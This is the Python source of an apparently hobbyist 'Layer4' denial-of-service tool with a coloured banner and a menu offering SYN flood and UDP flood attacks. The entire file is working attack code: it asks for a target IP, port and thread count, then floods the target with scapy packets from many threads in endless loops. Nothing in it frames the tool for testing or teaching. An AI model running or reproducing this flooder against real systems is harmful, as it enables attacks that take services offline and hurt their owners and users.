import os
import sys
import random
import threading
import time
from scapy.all import IP, TCP, UDP, Raw, send
from pystyle import Colorate, Colors

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, """
    ██╗      █████╗ ██╗   ██╗███████╗██████╗     ██╗  ██╗
    ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ██║  ██║
    ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝    ███████║
    ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗    ╚════██║
    ███████╗██║  ██║   ██║   ███████╗██║  ██║         ██║
    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝         ╚═╝ 
                              
    --------------------------------------
    Revolt : https://rvlt.gg/PeewQeV9
    Github : https://github.com/madanokr001
    coded by 건우Sec
    --------------------------------------
        
    Layer4 commands line:
        
    syn   |  syn flood attack
    udp   |  udp flood attack
    exit  |  exit layer3 menu

          
"""))

def layer4():
    while True:
        logo()
        select = input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@ZOIC~$]                                                                   
═══> 
"""))

        if select == "syn" or select.lower() == "1":
            def send_packets(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S", options=[("MSS", 1460)])
                    byte = Raw(load='X' * 1400)
                    pkt = ip / tcp / byte
                    send(pkt, verbose=0)
                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] SYN Packet : {pkt.summary()}"))
                    time.sleep(0.01)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@TARGET-IP]                                                                   
═══> 
"""))
            target_port = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@PORT]                                                                   
═══> 
""")))
            thread_count = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@THREADS]                                                                   
═══> 
""")))
            start_flooding(target_ip, target_port, thread_count)


        elif select == "udp" or select.lower() == "2":
            def udp_flood(target_ip, target_port):
                while True:
                    ip = IP(dst=target_ip)
                    udp = UDP(sport=random.randint(1024, 65535), dport=target_port)
                    byte = Raw(load='X' * 1400)
                    pkt = ip / udp / byte
                    send(pkt, verbose=0)
                    print(Colorate.Horizontal(Colors.cyan_to_green, f"[+] IP Address {target_ip} [*] UDP Packet : {pkt.summary()}"))
                    time.sleep(0.01)

            def start_flooding(target_ip, target_port, thread_count):
                threads = []
                for _ in range(thread_count):
                    thread = threading.Thread(target=udp_flood, args=(target_ip, target_port))
                    threads.append(thread)
                    thread.start()
                for thread in threads:
                    thread.join()

            target_ip = input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@TARGET-IP]                                                                   
═══> 
"""))
            target_port = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@PORT]                                                                   
═══> 
""")))
            thread_count = int(input(Colorate.Horizontal(Colors.green_to_blue,"""
═══[root@THREADS]                                                                   
═══> 
""")))
            start_flooding(target_ip, target_port, thread_count)
            

        elif select == "exit" or select.lower() == "2":
            sys.exit()
    
             


if __name__ == "__main__":
    layer4()
